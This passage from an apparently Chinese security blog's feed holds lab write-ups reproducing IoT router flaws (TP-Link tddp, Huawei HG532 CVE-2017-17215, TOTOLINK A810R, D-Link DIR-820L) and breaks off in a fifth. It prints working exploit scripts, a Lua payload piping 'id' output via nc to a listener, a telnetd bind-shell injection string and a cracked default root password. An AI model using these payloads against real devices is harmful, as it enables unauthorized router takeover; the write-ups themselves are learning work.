最后失败了</span><br><span class="line">disable = no  </span><br><span class="line">per_source = 11  </span><br><span class="line">cps = 100 2  </span><br><span class="line">flags = IPv4  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/default/atftpd</span><br><span class="line"></span><br><span class="line">USE_INETD=false</span><br><span class="line"># OPTIONS below are used only with init script</span><br><span class="line">OPTIONS=&quot;--tftpd-timeout 0  --retry-timeout 0 --mcast-port 1758 --mcast-addr 239.239.239.0-255 --mcast-ttl 1 --maxthread 100 --verbose=5 /tftpboot&quot;</span><br></pre></td></tr></table></figure><p>随后更改tftpboot文件夹的权限以及新增一个payload文件 用来执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 /tftpboot</span><br><span class="line">touch payload</span><br><span class="line">sudo vim payload</span><br><span class="line"></span><br><span class="line">function config_test(config)</span><br><span class="line">    os.execute(&quot;id|nc 192.168.6.2 6666&quot;)</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>在虚拟机启动tddp后 使用脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;|touch a||;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209311.png" alt="image.png"></a><br>随后我们前往&#x2F;tmp目录 可以找到刚刚创建的a文件 成功进行了任意的命令执行<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310102209512.png" alt="image.png"></a><br>接着来尝试第二种方法<br>开启tddp服务以后 执行下列脚本 同时我们需要在宿主机上监听一下6666端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 6666</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from socket import*</span><br><span class="line"></span><br><span class="line">from sys import*</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = socket(AF_INET,SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">s.connect((&quot;192.168.6.3&quot;,1040))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">payload = b&quot;\x01\x31&quot; #版本号和类型</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(12,b&#x27;\x00&#x27;) #填充垃圾数据</span><br><span class="line"></span><br><span class="line">payload += b&quot;/payload;aaa&quot;</span><br><span class="line"></span><br><span class="line">s.sendall(payload)</span><br></pre></td></tr></table></figure><p>使其执行payload文件中的指令<br>随后就可以在6666端口中接收到了id的回显<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310122341208.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310122341208.png" alt="image.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>通过本次复现 第一次接触到了协议洞 相比常规的命令执行 协议洞需要先了解清楚协议的数据包构成 才能看懂代码逻辑<br>发掘漏洞的思路还是通过定位execve或者是system这类敏感函数 然后再朔源查看是否存在控制参数的可能性</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE 2017-17215</title>
    <link href="http://example.com/2023/10/07/cve-2017-17215/"/>
    <id>http://example.com/2023/10/07/cve-2017-17215/</id>
    <published>2023-10-07T12:52:47.000Z</published>
    <updated>2023-10-07T13:20:19.160Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>华为HG532部分定制版本存在远程代码执行漏洞 经过身份验证的攻击者可以向端口 37215 发送恶意数据包以发起攻击 成功利用可能导致远程执行任意代码<br>固件下载地址: <a href="https://archive.org/download/RouterHG532e/router%20HG532e.rar">https://archive.org/download/RouterHG532e/router%20HG532e.rar</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>readelf分析出来是mips32位大端序<br>qemu启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mips -M malta -kernel ./mips_kernel/vmlinux-2.6.32-5-4kc-malta -hda ./mips_kernel/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>接着配置系统模拟的eth0接口为192.168.6.xx<br>随后利用scp上传一下提取出来的squashfs-root文件夹<br>接着需要再开一个终端 ssh连接一下<br>这里是因为&#x2F;bin&#x2F;mic文件的执行过程中会造成eth0接口的静态ip发生变化 所以需要我们利用ssh启动服务 随后在原本的会话中重新配置eth0接口的地址<br>挂载一下相关服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -o bind /dev ./squashfs-root/dev  </span><br><span class="line">mount -t proc /proc ./squashfs-root/proc/</span><br></pre></td></tr></table></figure><p>开启ssh连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss root@192.168.6.3</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line">./bin/upnp</span><br><span class="line">./bin/mic</span><br></pre></td></tr></table></figure><p>然后就会卡在这里 返回到qemu启动的那个会话 重新配置一下eth0接口就行了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072059413.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据官方的漏洞报告 我们可以得知漏洞出现的路径为&#x2F;ctrlt&#x2F;DeviceUpgrade_1 并且出现任意命令执行的参数为NewStatusURL和NewDownloadURL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">From looking into the UPnP description of the device, it can be seen that it supports a service type named `DeviceUpgrade`. This service is supposedly carrying out a firmware upgrade action by sending a request to “/ctrlt/DeviceUpgrade_1” (referred to as controlURL ) and is carried out with two elements  named `NewStatusURL` and `NewDownloadURL`.</span><br></pre></td></tr></table></figure><p>利用grep指令可以定位到DeviceUpgrade字符串位于upnp文件中有出现<br>利用NewDownloadURL定位到目标函数 发现直接通过sprintf传参给了system函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_40749C(int a1)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // $s1</span><br><span class="line">  const char *v4; // [sp+20h] [-40Ch] BYREF</span><br><span class="line">  const char *v5; // [sp+24h] [-408h] BYREF</span><br><span class="line">  char v6[1028]; // [sp+28h] [-404h] BYREF</span><br><span class="line"></span><br><span class="line">  v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewDownloadURL&quot;, 0, &amp;v4);</span><br><span class="line">  if ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = ATP_XML_GetChildNodeByName(*(_DWORD *)(a1 + 44), &quot;NewStatusURL&quot;, 0, &amp;v5);</span><br><span class="line">      if ( !v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v5 )</span><br><span class="line">        &#123;</span><br><span class="line">          snprintf(v6, 1024, &quot;upg -g -U %s -t &#x27;1 Firmware Upgrade Image&#x27; -c upnp -r %s -d -b&quot;, v4, v5);</span><br><span class="line">          system(v6);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个疑惑的点 虽然官方的报告说&#x2F;ctrlt&#x2F;DeviceUpgrade_1是负责固件的更新 但是不管是直接访问 还是抓包固件更新的按钮  我都没有得到访问该路径的包<br>所以只能直接用网上的exp了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line"></span><br><span class="line">    &quot;Authorization&quot;: &quot;Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669&quot;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">data = &#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line"></span><br><span class="line"> &lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;s:Body&gt;&lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewStatusURL&gt;;mkdir /bin/hell;&lt;/NewStatusURL&gt;</span><br><span class="line"></span><br><span class="line">   &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/u:Upgrade&gt;</span><br><span class="line"></span><br><span class="line"> &lt;/s:Body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/s:Envelope&gt;</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">requests.post(&#x27;http://192.168.6.3:37215/ctrlt/DeviceUpgrade_1&#x27;,headers=headers,data=data)</span><br></pre></td></tr></table></figure><p>如果成功执行 那么就会新建一个&#x2F;bin&#x2F;hell文件夹<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202310072119503.png" alt="image.png"></a></p><h1 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h1><p>不难看出 漏洞的核心点就在于system函数的参数没有得到限制 如果在实际的漏洞挖掘中<br>应该遍历涉及到system函数的地方 然后看参数是否可控 可控的话参数是否进行了过滤<br>如果可以利用 那么就朔源如何访问到这一函数 随后编写exp</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>TOTOLINK-A810R分析</title>
    <link href="http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2023/09/25/totolink-a810r%E5%88%86%E6%9E%90/</id>
    <published>2023-09-25T02:25:35.000Z</published>
    <updated>2023-09-26T13:39:49.613Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>偶然间看到了一个cve  是totolink的其他型号 随后发现我手上的这个貌似也存在这个漏洞 于是记录一下自己发掘的过程<br>设备型号:TOTOLINK A810R<br>固件版本: V5.9c.4573_B20191019<br>下载地址: <a href="https://totolink.tw/support_view/A810R">https://totolink.tw/support_view/A810R</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>binwalk提取出文件系统后 老规矩还是来看一下架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251030725.png" alt="image.png"></a><br>随后就是qemu系统模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#/bin/sh</span><br><span class="line"></span><br><span class="line">sudo tunctl -t top0 -u root</span><br><span class="line"></span><br><span class="line">sudo ifconfig top0 192.168.6.2</span><br><span class="line"></span><br><span class="line">sudo qemu-system-mipsel -M malta -kernel ./mipsel_kernel/vmlinux-3.2.0-4-4kc-malta -hda ./mipsel_kernel/debian_squeeze_mipsel_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -net nic -net tap,ifname=top0 -nographic</span><br></pre></td></tr></table></figure><p>然后上传文件系统 chroot以及启动服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -oHostKeyAlgorithms=+ssh-dss 1.zip root@192.168.6.3:/</span><br><span class="line">root/</span><br><span class="line">chroot ./squashfs-root /bin/sh</span><br><span class="line">./bin/lighttpd -f lighttp/lighttpd.conf  -m lighttp/lib/</span><br></pre></td></tr></table></figure><p>但是由于totolink的管理界面 常规的浏览器是不支持的 需要ie浏览器<br>但是linux安装ie浏览器过于麻烦 所以我直接闲鱼花30买了个真机用来复现</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>首先使用firmwalker来看一下文件系统中有什么可以利用的地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./firmwalker.sh ../iot/_TOTOLINK_A810R_V5.9c.4573_B20191019.web.extracted/squashfs-root ./firmwalker.txt</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309251048845.png" alt="image.png"></a><br>可以看到 存在着telnet服务 我们访问一下这个网页 看看有什么功能<br>访问后直接跳转到了登录界面<br>由于这里我们已经知道了用户密码 所以先登录进去<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309261328384.png" alt="image.png"></a><br>可以看到就是一个功能简单的 设置是否开启telnet服务的页面<br>这里直接使用burp来看一下按下apply按钮后发送的包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /cgi-bin/cstecgi.cgi HTTP/1.1</span><br><span class="line">Host: 192.168.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 60</span><br><span class="line">Origin: http://192.168.0.1</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.0.1/telnet.asp?timestamp=1695703177052</span><br><span class="line">Cookie: SESSION_ID=2:1571586185:2</span><br><span class="line"></span><br><span class="line">&#123;&quot;telnet_enabled&quot;:&quot;1&quot;,</span><br><span class="line">&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向cstecgi.cgi进行了一个post请求<br>包含了一个json表单 一个有两个参数 telnet_enabled和topicurl<br>前者应该是用来控制是否开启telnet服务 而后者应该是用来决定处理方式<br>因为利用浏览器的开发者工具 可以捕捉到一个包的参数为 “topicurl”:”setting&#x2F;getTelnetCfg”<br>同时我们观察一下包的内容  可以发现其实对于是否登录并没有进行检测<br>我们凭借这个poc就可以做到越权开启telnet服务<br>扫描端口发现开在了23<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262105067.png" alt="image.png"></a><br>尝试nc连接发现需要账号密码<br>而我们最开始使用firmwalker是扫描到了密码的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262106815.png" alt="image.png"></a><br>打开看看这三个文件 发现是空的 不过紧邻着etc&#x2F;shadow的shadow.example存放着root用户的md5加密后的密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:$1$BJXeRIOB$w1dFteNXpGDcSSWBMGsl2/:16090:0:99999:7:::</span><br><span class="line">nobody:*:0:0:99999:7:::</span><br></pre></td></tr></table></figure><p>解密后发现是cs2012<br>随后成功连接上路由器<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309262121818.png" alt="image.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2022-26258</title>
    <link href="http://example.com/2023/09/23/CVE-2022-26258/"/>
    <id>http://example.com/2023/09/23/CVE-2022-26258/</id>
    <published>2023-09-23T07:21:25.000Z</published>
    <updated>2023-09-23T15:29:37.253Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>设备型号:D-Link DIR-820L<br>固件下载地址:<a href="http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663">http://www.dlinktw.com.tw/techsupport/download.ashx?file=2663</a></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接直接选择使用Firmae进行模拟</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ./run.sh -r DIR ./DIR820LA1_FW105B03.bin</span><br></pre></td></tr></table></figure><p>第一次使用Firmae可能需要等的比较久 我等了二十分钟左右<br>出现下图中的样子就是启动成功了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232020051.png" alt="image.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>根据提供的描述 可以得知漏洞出现在lan.asp中的device_name</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D-Link DIR-820L 1.05B03 was discovered to contain a remote command execution (RCE) vulnerability via the Device Name parameter in /lan.asp.</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232022721.png" alt="image.png"></a><br>可以看到这个参数拼接到了paremStr中 作为copyDataToDataModelFormat函数的返回值<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232024272.png" alt="image.png"></a><br>朔源一下这个函数 推测出来请求的目标网址应该是get_set.ccp<br>在squashfs-root文件夹中查询一下这个字符串<br>没有找到这个文件名 应该是放到了后端处理 但是出现了四个使用到的二进制文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232026486.png" alt="image.png"></a><br>这里复制了这篇文章的描述: <a href="https://www.wangan.com/p/11v772975e2a5820">https://www.wangan.com/p/11v772975e2a5820</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">◆bin/smbd 程序是 Samba 服务器的一部分，它允许路由器用户与 Windows 客户端共享文件和打印机。Samba 服务器是一个开源软件，它实现了 SMB/CIFS 协议，这是 Windows 操作系统使用的文件和打印机共享协议。bin/smbd 程序是 Samba 服务器的核心组件之一，它提供了文件和打印机共享的功能。</span><br><span class="line"></span><br><span class="line">◆bin/flash 程序允许用户升级路由器固件，以获取最新的功能和安全补丁。它还可以用于还原路由器的出厂设置，以便在出现问题时恢复路由器的正常运行。</span><br><span class="line"></span><br><span class="line">◆sbin/ncc2 程序主要用于配置路由器的网络设置和管理路由器的各种功能。通过 ncc2 程序，用户可以轻松地设置无线网络、防火墙、端口转发等功能，使路由器的使用更加便捷和高效。</span><br><span class="line"></span><br><span class="line">◆lib/libapmib.so 是 D-Link 路由器系统中的一个库文件，它包含了许多重要的 API 和函数，用于实现路由器的各种功能。用户可以通过调用这些 API 和函数来访问和配置路由器的网络设置、无线网络、防火墙、端口转发等功能。</span><br></pre></td></tr></table></figure><p>所以这里我们选择ncc2这个程序 ida打开<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232110757.png" alt="image.png"></a><br>调用了hasInjectionString函数来判断是否存在注入字符串 这里需要查找一下过滤了哪些内容<br>查找一下这个函数是在哪个动态库声明的<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119195.png" alt="image.png"></a><br>最后成功找到了过滤的字符串<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232119626.png" alt="image.png"></a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>直接在管理界面修改device_name 随后点击保存 利用burp抓包<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309232133247.png" alt="image.png"></a><br>可以看到修改的应该是这个参数 这里选择使用telnetd来创建一个远程会话连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0atelnetd -l /bin/sh -p 7080 -b 0.0.0.0%0a</span><br></pre></td></tr></table></figure><p>%0a用来绕过字符判断<br>在7080端口建立一个&#x2F;bin&#x2F;sh的会话 等下直接nc这个端口就行了<br>可惜我自己试了半天都没有复现成功 不过学习个思路就行了</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>如果要换我来挖掘漏洞的话 我认为应该是先批量查找调用了system函数的二进制文件 找到ncc2以后 再根据其拼接参数的来源去进一步找到device_name </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="iot" scheme="http://example.com/categories/iot/"/>
    
    
  </entry>
  
  <entry>
    <title>cve-2018-5767</title>
    <link href="http://example.com/2023/09/15/cve-2018-5767/"/>
    <id>http://example.com/2023/09/15/cve-2018-5767/</id>
    <published>2023-09-15T03:03:19.000Z</published>
    <updated>2023-09-17T07:45:19.463Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一款arm架构的路由器 主要的漏洞位于httpd中 cookie可以产生栈溢出 同时httpd开启的保护很少 比较适合新手用于arm架构的学习<br>固件下载地址 <a href="https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1">https://drivers.softpedia.com/dyn-postdownload.php/d27e8410d32cd9de63a3506c47ded1bc/61ff85c5/75eb7/4/1</a></p><h1 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h1><p>使用binwalk提取出固件的文件系统<br>随后使用readelf查看一下固件的架构<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151144142.png" alt="image.png"></a><br>可以看到是32位的ARM架构<br>接下来如果我们直接使用qemu-arm-static来启动httpd的话 会提示缺失库文件<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151149403.png" alt="image.png"></a><br>我们需要把qemu-arm-static的文件拷贝到当前目录 随后利用chroot将当前目录作为根目录 随后再重新启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install qemu-user-static libc6-arm* libc6-dev-arm*</span><br><span class="line">cp /usr/bin/qemu-arm-static .</span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151152850.png" alt="image.png"></a><br>但是你会发现此时程序卡在了这里<br>先利用ida打开httpd 在字符串中搜索Welcome to 很快就定位了具体的位置<br>可以看到对于v18的值进行了检查 如果小于等于0就陷入死循环<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151158690.png" alt="image.png"></a><br>将断点打在这个puts函数 我们看看v18的值是怎么赋值的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb-multiarch ./bin/httpd</span><br><span class="line">target remote:1234</span><br><span class="line">b *0x2CF7C</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>可以看到此时的死循环和R3寄存器的值有关<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151212457.png" alt="image.png"></a><br>我们需要利用keypatch更改mvn这一条指令 使得r3的值大于0后可以绕过死循环<br>但是可以看到此时虽然跳过了while的死循环 但是程序输出错误后就直接结束了<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202309151221215.png" alt="image.png"></a><br>还是老办法 